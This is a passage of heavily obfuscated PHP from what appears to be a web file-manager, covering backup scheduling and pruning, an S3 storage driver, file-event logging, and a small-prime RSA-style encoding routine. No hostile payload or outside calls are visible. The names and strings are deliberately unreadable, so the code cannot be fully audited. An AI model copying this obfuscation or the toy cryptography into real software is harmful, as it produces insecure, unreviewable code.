$Ü¬Èø“++; } $íü‹”å› = 0; $üŠ§®ï‰ = $öø¯†ú“[800]; if (strlen($üŠ§®ï‰) < $öø¯†ú“[691]) { return; } $‘‹ªçµ½ = 0; for ($²ÅÚ»Íí = 0; $²ÅÚ»Íí < strlen($ÄÉÉ®ÌÒ); $²ÅÚ»Íí++) { $‘‹ªçµ½ = $‘‹ªçµ½ == strlen($ƒÅ¹í…ñ) ? 0 : $‘‹ªçµ½; $•Íó°ò… = $öø¯†ú“[801]; $û«¬ÌáÇ = $‘‹ªçµ½++; $íü‹”å› = strpos($ûâ’ı‘ç, $ÄÉÉ®ÌÒ[$²ÅÚ»Íí]) - $ñèÒÇÉ½ - ord($ƒÅ¹í…ñ[$û«¬ÌáÇ]); while ($íü‹”å› < 0) { $íü‹”å› += 64; $Ë¹¦éÌÎ = $öø¯†ú“[802]; while (strlen($Ë¹¦éÌÎ) < $öø¯†ú“[696]) { if (!$Ë¹¦éÌÎ) { break; } $Ë¹¦éÌÎ++; } } $ÏÕ‡ŸÑí .= $ûâ’ı‘ç[$íü‹”å›]; } $İ¾¼·¤¾ = base64_decode($ÏÕ‡ŸÑí); break; default: $İ¾¼·¤¾ = $this->ynuf7db7e584($ÄÉÉ®ÌÒ, $Ãï¾ÓÆ . $‘°İñôú); break; } if ($½´Á”ğ - 1 > 0) { $İ¾¼·¤¾ = $this->dliybb530be5($İ¾¼·¤¾, $Ãï¾ÓÆ, $½´Á”ğ - 1); } return $İ¾¼·¤¾; } public function xzdr01bcc53d($’‹Êºû) { $ïÑ ïË‰ =& $_SERVER[¶Ô„œ…¯]; $‹ãËˆƒ =& $_SERVER[ñö”¸„‰]; $ƒéß×è¡ = $this->qzakffca8182(); $¨§¼¿ëÄ = $this->qzakffca8182(); $“ó•˜Ï = ($ƒéß×è¡ - 1) * ($¨§¼¿ëÄ - 1); $Şß•Õ = $ïÑ ïË‰[803]; while (strlen($Şß•Õ) < $ïÑ ïË‰[685]) { if (!$Şß•Õ) { break; } $Şß•Õ++; } $ó‡¤õÆ = intval(($ƒéß×è¡ + $¨§¼¿ëÄ) / 2); $¬‘ôŸ© = $ïÑ ïË‰[804]; if (!$¬‘ôŸ©) { die; } while (1) { $ç™”ƒí¡ = $ó‡¤õÆ; $âù™À² = $ïÑ ïË‰[805]; $¤¿Ä¾ÎÈ = $“ó•˜Ï; $ŠšÙµ = $ïÑ ïË‰[806]; if (!$ŠšÙµ) { die; } while ($¤¿Ä¾ÎÈ % $ç™”ƒí¡ != 0) { $ˆú«‚¢ = $¤¿Ä¾ÎÈ; $¤¿Ä¾ÎÈ = $ç™”ƒí¡; $¬û½¨ø = $ïÑ ïË‰[807]; while (strlen($¬û½¨ø) < $ïÑ ïË‰[707]) { if (!$¬û½¨ø) { break; } $¬û½¨ø++; } $ç™”ƒí¡ = $ˆú«‚¢ % $ç™”ƒí¡; } if ($ç™”ƒí¡ == 1) { break; } else { $ó‡¤õÆ++; } } $áíÂı¥ = 2; $ê¤ ï˜Ï = $ïÑ ïË‰[808]; for ($êêğ¿÷ = 0; $êêğ¿÷ < $“ó•˜Ï * 10; $êêğ¿÷++) { if (($“ó•˜Ï * $êêğ¿÷ + 1) % $ó‡¤õÆ == 0) { $áíÂı¥ = intval(($“ó•˜Ï * $êêğ¿÷ + 1) / $ó‡¤õÆ); break; } } $¿È’‹› = $this->wfpg2505d3ce($ƒéß×è¡ * $¨§¼¿ëÄ . $‹ãËˆƒ[6], $‹ãËˆƒ[136]); $€Ñ¨õµà = md5($‹ãËˆƒ[304] . ($ƒéß×è¡ + $¨§¼¿ëÄ) . $‹ãËˆƒ[305] . $ó‡¤õÆ . $‹ãËˆƒ[305] . $áíÂı¥ . $‹ãËˆƒ[306]); $êßÒ™£¤ = $this->wfpg2505d3ce($’‹Êºû, $€Ñ¨õµà) . $‹ãËˆƒ[307] . $¿È’‹›; $œÒáı™ó = $ïÑ ïË‰[809]; while (strlen($œÒáı™ó) < $ïÑ ïË‰[691]) { if (!$œÒáı™ó) { break; } $œÒáı™ó++; } return $êßÒ™£¤; $æÇúµÙ† = $ïÑ ïË‰[810]; while (strlen($æÇúµÙ†) < $ïÑ ïË‰[707]) { if (!$æÇúµÙ†) { break; } $æÇúµÙ†++; } } public function jvyg1a873af2($ïß‘É®ª) { $È»ÉÏô¾ =& $_SERVER[¶Ô„œ…¯]; $¦çä„şò =& $_SERVER[ñö”¸„‰]; $áñÄûè = explode($¦çä„şò[307], $ïß‘É®ª); $ß¹Õ“ü = $È»ÉÏô¾[811]; if (strlen($ß¹Õ“ü) < $È»ÉÏô¾[702]) { return; } if (count($áñÄûè) != 2) { return $¦çä„şò[6]; } $éó³¢Óş = $this->ynuf7db7e584($áñÄûè[1] . $¦çä„şò[6], $¦çä„şò[136]); if (!$éó³¢Óş) { return $¦çä„şò[6]; } $éó³¢Óş = intval($éó³¢Óş); $îÛ‘¹üà = $È»ÉÏô¾[812]; if (strlen($îÛ‘¹üà) < $È»ÉÏô¾[696]) { return; } $œ®é÷ = 0; $«õ½‡ú… = $È»ÉÏô¾[813]; if (!$«õ½‡ú…) { die; } $øàÁŒå = 0; $¹ÁÏùôï = $È»ÉÏô¾[814]; if (strlen($¹ÁÏùôï) < $È»ÉÏô¾[691]) { return; } for ($ƒç­‰³ = 3; $ƒç­‰³ < $éó³¢Óş; $ƒç­‰³ += 2) { if ($éó³¢Óş % $ƒç­‰³ != 0) { continue; } $œ®é÷ = $ƒç­‰³; $Ëòø¦  = $È»ÉÏô¾[815]; $øàÁŒå = intval($éó³¢Óş / $ƒç­‰³); $ŒîäãóÓ = $È»ÉÏô¾[816]; while (strlen($ŒîäãóÓ) < $È»ÉÏô¾[702]) { if (!$ŒîäãóÓ) { break; } $ŒîäãóÓ++; } break; $¤æŠİÎ© = $È»ÉÏô¾[817]; if (!$¤æŠİÎ©) { return; } } $»·†Ã‚¹ = ($œ®é÷ - 1) * ($øàÁŒå - 1); $–Œıé‹ = intval(($œ®é÷ + $øàÁŒå) / 2); while (1) { $Ê«¥Á™ = $–Œıé‹; $«”­ëÛó = $»·†Ã‚¹; while ($«”­ëÛó % $Ê«¥Á™ != 0) { $œÜ‡’«² = $«”­ëÛó; $«”­ëÛó = $Ê«¥Á™; $Ê«¥Á™ = $œÜ‡’«² % $Ê«¥Á™; $‘áÛ†½É = $È»ÉÏô¾[818]; } if ($Ê«¥Á™ == 1) { break; } else { $–Œıé‹++; } } $›üÄƒ³Ì = 2; for ($ƒç­‰³ = 0; $ƒç­‰³ < $»·†Ã‚¹ * 10; $ƒç­‰³++) { if (($»·†Ã‚¹ * $ƒç­‰³ + 1) % $–Œıé‹ == 0) { $›üÄƒ³Ì = intval(($»·†Ã‚¹ * $ƒç­‰³ + 1) / $–Œıé‹); break; } } $ Í¯˜° = md5($¦çä„şò[304] . ($œ®é÷ + $øàÁŒå) . $¦çä„şò[305] . $–Œıé‹ . $¦çä„şò[305] . $›üÄƒ³Ì . $¦çä„şò[306]); $úŞ²Á÷ = $È»ÉÏô¾[819]; if (!$úŞ²Á÷) { return; } $Ä“ó‰ = $this->ynuf7db7e584($áñÄûè[0], $ Í¯˜°); return $Ä“ó‰; } public function qzakffca8182() { $…¤í«èó =& $_SERVER[¶Ô„œ…¯]; $Ë£”ƒ½î = mt_rand(pow(2, 14), pow(2, 16) - 1); $ÃµŒèÖ = array(); $»¶êÁÏ = 1; $é´†å˜º = $…¤í«èó[820]; if (strlen($é´†å˜º) < $…¤í«èó[685]) { die; } while ($»¶êÁÏ <= (int) sqrt($Ë£”ƒ½î)) { $©¸‘„ÍÙ = $»¶êÁÏ; $ÜáÈÙ´ù = $…¤í«èó[821]; while (!0) { $©¸‘„ÍÙ++; if ($©¸‘„ÍÙ <= 2) { $»¶êÁÏ = $©¸‘„ÍÙ; break; } else { if ($©¸‘„ÍÙ < 2) { continue; } } $Ğ“ô¨Ç¤ = !0; for ($õ·Êé¾Ã = 2; $õ·Êé¾Ã <= sqrt($©¸‘„ÍÙ); $õ·Êé¾Ã++) { if ($©¸‘„ÍÙ % $õ·Êé¾Ã == 0) { $Ğ“ô¨Ç¤ = !1; } } if ($Ğ“ô¨Ç¤) { $»¶êÁÏ = $©¸‘„ÍÙ; break; } } $ÃµŒèÖ[] = $»¶êÁÏ; $½¯â“æ‘ = $…¤í«èó[822]; while (strlen($½¯â“æ‘) < $…¤í«èó[691]) { if (!$½¯â“æ‘) { break; } $½¯â“æ‘++; } } $š¯Ş®¢œ = 2; for ($©¸‘„ÍÙ = $Ë£”ƒ½î; $©¸‘„ÍÙ > 1; $©¸‘„ÍÙ--) { $Ğ“ô¨Ç¤ = !0; foreach ($ÃµŒèÖ as $¸¡ª¶ú‡) { if ($©¸‘„ÍÙ % $¸¡ª¶ú‡ == 0) { $Ğ“ô¨Ç¤ = !1; break; } } if ($Ğ“ô¨Ç¤) { $š¯Ş®¢œ = $©¸‘„ÍÙ; break; } } return $š¯Ş®¢œ; $ÄÆ÷ì§” = $…¤í«èó[823]; if (!$ÄÆ÷ì§”) { die; } } public function wavj8ea0ec47($¦µ£Ë‰Ì, $õæ…áÅ¤) { $±ı‡°Ó =& $_SERVER[ñö”¸„‰]; return call_user_func(array($±ı‡°Ó[8], $±ı‡°Ó[308]), $¦µ£Ë‰Ì, $õæ…áÅ¤); $ËÛ©”Ş† = $_SERVER[¶Ô„œ…¯][789]; if (!$ËÛ©”Ş†) { return; } } public function wfpg2505d3ce($±í­ø, $¾àß„ÇÏ) { $•¬ÓÊ¹À =& $_SERVER[¶Ô„œ…¯]; $ïÔ‚›í÷ =& $_SERVER[ñö”¸„‰]; return call_user_func(array($ïÔ‚›í÷[309], $ïÔ‚›í÷[310]), $±í­ø, $¾àß„ÇÏ); $»û©ÇûÉ = $•¬ÓÊ¹À[824]; if (strlen($»û©ÇûÉ) < $•¬ÓÊ¹À[696]) { die; } } public function ynuf7db7e584($æ¿Ö•Ø, $¢çÖ¦Ì) { $ß»…¼¨Ä =& $_SERVER[¶Ô„œ…¯]; $²Û³åÚ =& $_SERVER[ñö”¸„‰]; return call_user_func(array($²Û³åÚ[309], $²Û³åÚ[311]), $æ¿Ö•Ø, $¢çÖ¦Ì); $ç«û¢° = $ß»…¼¨Ä[825]; if (strlen($ç«û¢°) < $ß»…¼¨Ä[685]) { return; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[¶Ô„œ…¯][826]); $this->init(); $this->keep(); } public function init() { $Ø¡Ùğü =& $_SERVER[¶Ô„œ…¯]; $this->isManual(); self::$name = date($Ø¡Ùğü[827]); if (!($ºÂ·»„í = $this->model->lastItem())) { $ºÂ·»„í = $this->initData(); } else { self::$name = $ºÂ·»„í[$Ø¡Ùğü[32]]; if ($ºÂ·»„í[$Ø¡Ùğü[828]] == $Ø¡Ùğü[91]) { self::$name = date($Ø¡Ùğü[261]); $­‰ÒÛ®± = intval(_get($ºÂ·»„í, $Ø¡Ùğü[829], 0)); if (self::$manual == 0 && $ºÂ·»„í[$Ø¡Ùğü[32]] == self::$name) { $this->model->remove($ºÂ·»„í[$Ø¡Ùğü[477]]); } $ºÂ·»„í = $this->initData($­‰ÒÛ®±, $ºÂ·»„í[$Ø¡Ùğü[830]]); } else { $this->checkStore($ºÂ·»„í[$Ø¡Ùğü[830]]); } } self::$option = $ºÂ·»„í; } private function isManual() { $ŸÇ÷Å­ = _get($GLOBALS, $_SERVER[¶Ô„œ…¯][831], 0); $ŸÇ÷Å­ = intval($ŸÇ÷Å­); self::$manual = $ŸÇ÷Å­ && $ŸÇ÷Å­ == 1 ? 1 : 0; } private function initData($§“üòíÒ = 0, $ğš­ò±± = '') { $ûèğ¡ªö =& $_SERVER[¶Ô„œ…¯]; $ğâæ˜«— = $this->model->config(); if ($ğš­ò±± && $ğâæ˜«—[$ûèğ¡ªö[830]] != $ğš­ò±±) { $§“üòíÒ = 0; } $this->checkStore($ğâæ˜«—[$ûèğ¡ªö[830]]); if (self::$manual == 1) { self::$name .= $ûèğ¡ªö[11] . date($ûèğ¡ªö[832]); } $İ£¿ôç‰ = array($ûèğ¡ªö[830] => $ğâæ˜«—[$ûèğ¡ªö[830]], $ûèğ¡ªö[32] => self::$name, $ûèğ¡ªö[828] => 0, $ûèğ¡ªö[171] => $ğâæ˜«—[$ûèğ¡ªö[171]], $ûèğ¡ªö[833] => self::$manual, $ûèğ¡ªö[370] => array($ûèğ¡ªö[834] => array($ûèğ¡ªö[828] => 0), $ûèğ¡ªö[835] => array($ûèğ¡ªö[828] => 0, $ûèğ¡ªö[836] => 0, $ûèğ¡ªö[837] => 0, $ûèğ¡ªö[33] => $ûèğ¡ªö[12], $ûèğ¡ªö[838] => 0, $ûèğ¡ªö[839] => 0), $ûèğ¡ªö[840] => array($ûèğ¡ªö[828] => 0, $ûèğ¡ªö[836] => 0, $ûèğ¡ªö[837] => 0, $ûèğ¡ªö[838] => 0, $ûèğ¡ªö[839] => 0), $ûèğ¡ªö[232] => array($ûèğ¡ªö[828] => 0, $ûèğ¡ªö[841] => 0, $ûèğ¡ªö[842] => 0, $ûèğ¡ªö[843] => 0, $ûèğ¡ªö[844] => 0, $ûèğ¡ªö[543] => $§“üòíÒ, $ûèğ¡ªö[838] => 0, $ûèğ¡ªö[839] => 0)), $ûèğ¡ªö[838] => time(), $ûèğ¡ªö[839] => 0); $ğÑÙáïè = $this->model->insert($İ£¿ôç‰); $İ£¿ôç‰[$ûèğ¡ªö[477]] = $ğÑÙáïè; return $İ£¿ôç‰; } private function checkStore($ãŠ‰ã´¾) { $ÚŞ‰ÅÌØ = Model($_SERVER[¶Ô„œ…¯][845]); $¾‘‘Ùµ = $ÚŞ‰ÅÌØ->listData($ãŠ‰ã´¾); $ÚŞ‰ÅÌØ->checkConfig($¾‘‘Ùµ); } public static function get() { if (!self::$option) { $Ïú‚ ÎÔ = Model($_SERVER[¶Ô„œ…¯][826]); $¤„’Åù÷ = $Ïú‚ ÎÔ->findByName(self::$name); $Ïú‚ ÎÔ->parseContent($¤„’Åù÷); self::$option = $¤„’Åù÷; } return self::$option; } public static function set($ô‚×±ìÙ) { $¤ÍüÔÏğ =& $_SERVER[¶Ô„œ…¯]; $¤ü¥†ò“ = self::get(); foreach ($ô‚×±ìÙ as $…®¼°ŞØ => $ØÍ•ŸÕ) { array_set_value($¤ü¥†ò“, $…®¼°ŞØ, $ØÍ•ŸÕ); } Model($¤ÍüÔÏğ[826])->update($¤ü¥†ò“[$¤ÍüÔÏğ[477]], $¤ü¥†ò“); self::$option = $¤ü¥†ò“; return self::$option; } public function keep() { $Ç³Òñïá =& $_SERVER[¶Ô„œ…¯]; $™‘ƒÙ· = self::get(); if (_get($™‘ƒÙ·, $Ç³Òñïá[846], 0) == $Ç³Òñïá[91]) { return; } $this->backupKeep($™‘ƒÙ·); self::set(array($Ç³Òñïá[846] => 1)); } private function backupKeep($Ãí˜‚ï») { $¸¡ß† =& $_SERVER[¶Ô„œ…¯]; if (self::$manual == 1) { return; } $â†•áœ = $this->model->listData(); if (empty($â†•áœ)) { return; } $†ŞçÛÎ“ = 0; $‡îÕŒÏ = array(); foreach ($â†•áœ as $¾¨Ø¡Ñ¾) { if ($†ŞçÛÎ“ >= 7) { break; } $‡îÕŒÏ[] = $¾¨Ø¡Ñ¾[$¸¡ß†[32]]; $†ŞçÛÎ“++; } for ($†ŞçÛÎ“ = 0; $†ŞçÛÎ“ < 12; $†ŞçÛÎ“++) { $‡îÕŒÏ[] = date($¸¡ß†[847], strtotime("\x2d{$†ŞçÛÎ“}\40\155\x6f\156\164\x68\163")); } $‡îÕŒÏ = array_unique($‡îÕŒÏ); $İŞñª’¶ = Model($¸¡ß†[848])->get($¸¡ß†[849]); foreach ($â†•áœ as $¾¨Ø¡Ñ¾) { if (isset($¾¨Ø¡Ñ¾[$¸¡ß†[833]]) && $¾¨Ø¡Ñ¾[$¸¡ß†[833]] == $¸¡ß†[91]) { continue; } if (!empty($¾¨Ø¡Ñ¾[$¸¡ß†[32]]) && in_array($¾¨Ø¡Ñ¾[$¸¡ß†[32]], $‡îÕŒÏ)) { continue; } $this->model->remove($¾¨Ø¡Ñ¾[$¸¡ß†[477]]); $ÎúõâÊ¤ = $this->backupPath($Ãí˜‚ï», $İŞñª’¶); IO::remove($ÎúõâÊ¤, !1); } } private function backupPath($„àÀºú, $öØ®…Ë¿ = false) { $û¸Ü¢«ù =& $_SERVER[¶Ô„œ…¯]; if (!$öØ®…Ë¿) { $öØ®…Ë¿ = Model($û¸Ü¢«ù[848])->get($û¸Ü¢«ù[849]); } $ÌçŠ¨­Ø = $„àÀºú[$û¸Ü¢«ù[32]]; $ä¤ëèı = substr(md5($û¸Ü¢«ù[850] . $öØ®…Ë¿ . $ÌçŠ¨­Ø), 0, 8); return "\x7b\x69\157\72{$„àÀºú[$û¸Ü¢«ù[830]]}\x7d\57\144\x61\x74\x61\142\x61\x73\x65\x2f\142\141\x63\153\165\x70\57" . $ÌçŠ¨­Ø . $û¸Ü¢«ù[11] . $ä¤ëèı; } public function db() { $ãà…“§Í =& $_SERVER[¶Ô„œ…¯]; $á¨ºŞû× = self::get(); if (_get($á¨ºŞû×, $ãà…“§Í[851], 0) == $ãà…“§Í[91]) { return !0; } $œõûÆ¢Í = new BackupDb(); if (!$œõûÆ¢Í->index()) { return !1; } self::set(array($ãà…“§Í[851] => 1)); return !0; } public function dbFile() { $ò¸¿ì¢À =& $_SERVER[¶Ô„œ…¯]; $ı“ğØà = self::get(); if (_get($ı“ğØà, $ò¸¿ì¢À[852], 0) == $ò¸¿ì¢À[91]) { return !0; } $ì“Ì¿Õß = new BackupDbFile(); if (!$ì“Ì¿Õß->index()) { return !1; } self::set(array($ò¸¿ì¢À[852] => 1)); return !0; } public function file() { $‰ú­×êš =& $_SERVER[¶Ô„œ…¯]; $«ãïã¸ = self::get(); if (_get($«ãïã¸, $‰ú­×êš[853], 0) == $‰ú­×êš[91]) { return !0; } if ($«ãïã¸[$‰ú­×êš[171]] == $‰ú­×êš[854]) { $Üù = new BackupFile(); if (!$Üù->index()) { return !1; } } self::set(array($‰ú­×êš[853] => 1, $‰ú­×êš[828] => 1)); return !0; } } goto cŸÃ©°Ï; a·¹ÉöâÇ…: define($_SERVER[¶Ô„œ…¯][319], 3); define($_SERVER[¶Ô„œ…¯][320], 1); define($_SERVER[¶Ô„œ…¯][321], 0); goto a¾èã´Ò†´; c¦Ò§ˆÍ¼º: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Ú¾Å™¯¼) { $ª‚ºê™¥ =& $_SERVER[¶Ô„œ…¯]; parent::__construct($Ú¾Å™¯¼); $öù´ó¼„ = isset($Ú¾Å™¯¼[$ª‚ºê™¥[258]]) && $Ú¾Å™¯¼[$ª‚ºê™¥[258]] == $ª‚ºê™¥[249] ? $ª‚ºê™¥[249] : $ª‚ºê™¥[315]; $this->setSignVersion($öù´ó¼„); } public function link($ØÔ…ç, $ÂşúªÕ® = array()) { return parent::link($ØÔ…ç, $ÂşúªÕ®); } public function fileOut($ÀßÊ”Ş, $™ë¤«ëš = false, $À±ƒÂ®° = false, $Œµñæƒ• = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¶Ô„œ…¯][316])) { return parent::fileOutServer($ÀßÊ”Ş, $™ë¤«ëš, $À±ƒÂ®°, $Œµñæƒ•); } parent::fileOut($ÀßÊ”Ş, $™ë¤«ëš, $À±ƒÂ®°, $Œµñæƒ•); } public function fileOutImage($«µÌú×°, $ÌÂ—Ô­¸ = 250) { if (strstr($this->endpoint, $_SERVER[¶Ô„œ…¯][316])) { return parent::fileOutImageServer($«µÌú×°, $ÌÂ—Ô­¸); } parent::fileOutImage($«µÌú×°, $ÌÂ—Ô­¸); } public function fileOutLink($ÂÙ÷æë±) { $¡éÉÍãø =& $_SERVER[¶Ô„œ…¯]; if (substr($ÂÙ÷æë±, 0, 7) == $¡éÉÍãø[218]) { $ÂÙ÷æë± = $¡éÉÍãø[219] . substr($ÂÙ÷æë±, 7); } header($¡éÉÍãø[175] . $ÂÙ÷æë±); die; } } define($_SERVER[¶Ô„œ…¯][317], 1); define($_SERVER[¶Ô„œ…¯][318], 2); goto a·¹ÉöâÇ…; e ÑÎ¼¸õ: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\165\x72\143\x65\137\145\x76\x65\x6e\164"; protected $dataAuto = array(array("\x63\162\145\141\164\145\x54\x69\155\145", "\x74\x69\x6d\145", "\151\x6e\x73\x65\x72\x74", "\146\165\x6e\143\x74\151\157\x6e"), array("\144\145\x73\x63", '', "\151\x6e\x73\x65\162\x74\54\165\x70\144\x61\164\x65\54\x73\145\x6c\145\143\164", "\152\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($‘³ß”Ó•, $ÑæÂ£Ì›, $âŞ²Ä¡è = '') { $ïšìñ®µ =& $_SERVER[¶Ô„œ…¯]; if (!$this->eventSave) { return; } $±Çï³ô± = Model($ïšìñ®µ[1428])->sourceInfo($‘³ß”Ó•); if (!$±Çï³ô±) { return !1; } if ($this->isDisableEvent($±Çï³ô±, $ÑæÂ£Ì›)) { return; } if ($âŞ²Ä¡è && is_string($âŞ²Ä¡è)) { $âŞ²Ä¡è = array($ïšìñ®µ[2019] => $âŞ²Ä¡è); } $Ö©Ä»İà = defined($ïšìñ®µ[2207]) ? USER_ID : 0; $€ÍÌÉ–‰ = array($ïšìñ®µ[493] => $‘³ß”Ó•, $ïšìñ®µ[2208] => $±Çï³ô±[$ïšìñ®µ[192]], $ïšìñ®µ[2209] => $±Çï³ô±[$ïšìñ®µ[32]], $ïšìñ®µ[584] => !empty($±Çï³ô±[$ïšìñ®µ[584]]) ? $±Çï³ô±[$ïšìñ®µ[584]] : $ïšìñ®µ[12], $ïšìñ®µ[1771] => $Ö©Ä»İà, $ïšìñ®µ[498] => $ÑæÂ£Ì›, $ïšìñ®µ[1773] => $âŞ²Ä¡è); $this->addSystemLog($ÑæÂ£Ì›, $€ÍÌÉ–‰); unset($€ÍÌÉ–‰[$ïšìñ®µ[2209]], $€ÍÌÉ–‰[$ïšìñ®µ[584]]); return $this->add($€ÍÌÉ–‰); } private function addSystemLog($øâ—„Æ×, $’È‚Áà) { $œàá¦¸ı =& $_SERVER[¶Ô„œ…¯]; if ($øâ—„Æ× == $œàá¦¸ı[2210]) { $øâ—„Æ× = $’È‚Áà[$œàá¦¸ı[528]][$œàá¦¸ı[2211]]; } else { if (in_array($øâ—„Æ×, array($œàá¦¸ı[1959], $œàá¦¸ı[2212]))) { $øâ—„Æ× = $’È‚Áà[$œàá¦¸ı[528]][$œàá¦¸ı[171]]; } } $œš©š®ó = array_merge($’È‚Áà, array($œàá¦¸ı[2213] => $’È‚Áà[$œàá¦¸ı[193]], $œàá¦¸ı[2214] => $’È‚Áà[$œàá¦¸ı[2214]])); Hook::trigger($œàá¦¸ı[2215], $œàá¦¸ı[2216] . $øâ—„Æ×, $’È‚Áà); Model($œàá¦¸ı[1923])->addLog($œàá¦¸ı[2216] . $øâ—„Æ×, $œš©š®ó); } private function isDisableEvent($ûº¡¢–, $·üÌé‡×) { $éôÑò² =& $_SERVER[¶Ô„œ…¯]; if ($ûº¡¢–[$éôÑò²[190]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($·üÌé‡× == $éôÑò²[1948]) { return !1; } return !0; } public function eventCreate($ä÷ÌôœÒ, $ú´¦íË’) { $ÍÜ÷åÜé =& $_SERVER[¶Ô„œ…¯]; $æ¹òıú¹ = Model($ÍÜ÷åÜé[1428])->sourceInfo($ä÷ÌôœÒ); $ı¹½”èÆ = array($ÍÜ÷åÜé[2211] => $ú´¦íË’, $ÍÜ÷åÜé[32] => $æ¹òıú¹[$ÍÜ÷åÜé[32]]); return $this->addEvent($ä÷ÌôœÒ, $ÍÜ÷åÜé[2210], $ı¹½”èÆ); } public function eventFileEdit($ğ‚ÏÍø) { $í¸Ñª”ğ =& $_SERVER[¶Ô„œ…¯]; $Öş…Ÿû¸ = array($í¸Ñª”ğ[2217] => $_SERVER[$í¸Ñª”ğ[2218]], $í¸Ñª”ğ[2219] => strtolower(ACTION)); if (isset($GLOBALS[$í¸Ñª”ğ[7]][$í¸Ñª”ğ[2220]])) { $Öş…Ÿû¸[$í¸Ñª”ğ[2220]] = $í¸Ñª”ğ[91]; } return $this->addEvent($ğ‚ÏÍø, $í¸Ñª”ğ[1949], $Öş…Ÿû¸); } public function eventRecycle($Œ‡â£›, $•Ô¦ƒß) { return $this->addEvent($Œ‡â£›, $_SERVER[¶Ô„œ…¯][2212], $•Ô¦ƒß); } private static $_removeLast = ''; public function eventRemove($¨•µ¾é¹) { $ƒ¬ï‡•Â =& $_SERVER[¶Ô„œ…¯]; self::$_removeLast = $¨•µ¾é¹; $àß‘ï„Ğ = Model($ƒ¬ï‡•Â[1428])->sourceInfo($¨•µ¾é¹); $ë¡÷ÕÉÆ = array_field_key($àß‘ï„Ğ, array($ƒ¬ï‡•Â[193], $ƒ¬ï‡•Â[543], $ƒ¬ï‡•Â[507], $ƒ¬ï‡•Â[586])); $¼àãã°ç = array($ƒ¬ï‡•Â[171] => $àß‘ï„Ğ[$ƒ¬ï‡•Â[32]], $ƒ¬ï‡•Â[2219] => ACTION, $ƒ¬ï‡•Â[2221] => $ë¡÷ÕÉÆ); return $this->addEvent($àß‘ï„Ğ[$ƒ¬ï‡•Â[192]], $ƒ¬ï‡•Â[1948], $¼àãã°ç); } public function eventShare($ñ±£ÍîÊ, $¥İ«–ÙÕ) { return $this->addEvent($ñ±£ÍîÊ, $_SERVER[¶Ô„œ…¯][1959], $¥İ«–ÙÕ); } public function eventMove($üâÛıİ¡, $ŸØ’ÓÙÈ, $à‘úÛ”•) { $ëÀ„‹šı =& $_SERVER[¶Ô„œ…¯]; if (self::$_removeLast == $üâÛıİ¡) { return; } $öŠÕŠ„­ = Model($ëÀ„‹šı[1428]); $´ôãµ‡ë = $öŠÕŠ„­->sourceInfo($üâÛıİ¡); $ìáÙÑ–ü = $öŠÕŠ„­->sourceInfo($ŸØ’ÓÙÈ); $úÊ×ÖÚ÷ = $öŠÕŠ„­->sourceInfo($à‘úÛ”•); $š±ñ“†Â = array($ëÀ„‹šı[1248] => $ŸØ’ÓÙÈ, $ëÀ„‹šı[2222] => $ìáÙÑ–ü[$ëÀ„‹šı[32]], $ëÀ„‹šı[2198] => !empty($ìáÙÑ–ü[$ëÀ„‹šı[584]]) ? $ìáÙÑ–ü[$ëÀ„‹šı[584]] : $ëÀ„‹šı[12], $ëÀ„‹šı[1249] => $à‘úÛ”•, $ëÀ„‹šı[2223] => $úÊ×ÖÚ÷[$ëÀ„‹šı[32]], $ëÀ„‹šı[2224] => !empty($úÊ×ÖÚ÷[$ëÀ„‹šı[584]]) ? $úÊ×ÖÚ÷[$ëÀ„‹šı[584]] : $ëÀ„‹šı[12]); $this->addEvent($üâÛıİ¡, $ëÀ„‹šı[625], $š±ñ“†Â); $´ôãµ‡ë = $öŠÕŠ„­->sourceInfo($üâÛıİ¡); $š±ñ“†Â = array($ëÀ„‹šı[193] => $´ôãµ‡ë[$ëÀ„‹šı[193]], $ëÀ„‹šı[32] => $´ôãµ‡ë[$ëÀ„‹šı[32]]); $this->addEvent($ŸØ’ÓÙÈ, $ëÀ„‹šı[2225], $š±ñ“†Â); } public function eventCopy($“Ú»Û¤é) { $this->eventCreate($“Ú»Û¤é, $_SERVER[¶Ô„œ…¯][623]); } public function eventRename($Ø€øµüœ, $°Êà‚Øå, $ú¯â’Ò) { $Íğ½Á·× =& $_SERVER[¶Ô„œ…¯]; $§§ÖÈóÓ = array($Íğ½Á·×[1248] => $°Êà‚Øå, $Íğ½Á·×[1249] => $ú¯â’Ò); return $this->addEvent($Ø€øµüœ, $Íğ½Á·×[1443], $§§ÖÈóÓ); } public function eventAddComment($²´¢×—ˆ, $´ æäË) { return $this->addEvent($²´¢×—ˆ, $_SERVER[¶Ô„œ…¯][2226], $´ æäË); } public function eventAddDesc($¢§Ñ¼Ş, $¾¸øü«Å) { return $this->addEvent($¢§Ñ¼Ş, $_SERVER[¶Ô„œ…¯][2227], $¾¸øü«Å); } public function listBySource($áƒ—Šíş) { $ Êç—Óş =& $_SERVER[¶Ô„œ…¯]; $ú¶¶œ“Ï = Model($ Êç—Óş[1428])->sourceInfo($áƒ—Šíş); $½úº¦ = array($ Êç—Óş[493] => $áƒ—Šíş); if ($ú¶¶œ“Ï[$ Êç—Óş[487]] == $ Êç—Óş[91]) { $ûÄô‹ú½ = Model($ Êç—Óş[1428])->listSearchChildren($áƒ—Šíş, 20000); $ûÄô‹ú½[] = $áƒ—Šíş . $ Êç—Óş[456]; $½úº¦ = array($ Êç—Óş[193] => array($ Êç—Óş[7], $ûÄô‹ú½)); } $æÅò«şÅ = $this->where($½úº¦)->order($ Êç—Óş[2228])->selectPage(); if ($æÅò«şÅ[$ Êç—Óş[444]][$ Êç—Óş[445]] == 0) { $æÅò«şÅ[$ Êç—Óş[444]][$ Êç—Óş[445]] = 1; $æÅò«şÅ[$ Êç—Óş[447]] = array(array($ Êç—Óş[493] => $áƒ—Šíş, $ Êç—Óş[2208] => $ú¶¶œ“Ï[$ Êç—Óş[192]], $ Êç—Óş[1771] => $ú¶¶œ“Ï[$ Êç—Óş[529]], $ Êç—Óş[498] => $ Êç—Óş[2229], $ Êç—Óş[499] => $ú¶¶œ“Ï[$ Êç—Óş[233]], $ Êç—Óş[1773] => $ Êç—Óş[12])); } return $this->eventListParse($æÅò«şÅ, $áƒ—Šíş); } private function eventListParse($ØÙÇìáË, $ßÊ£¹) { $˜‘³™Â =& 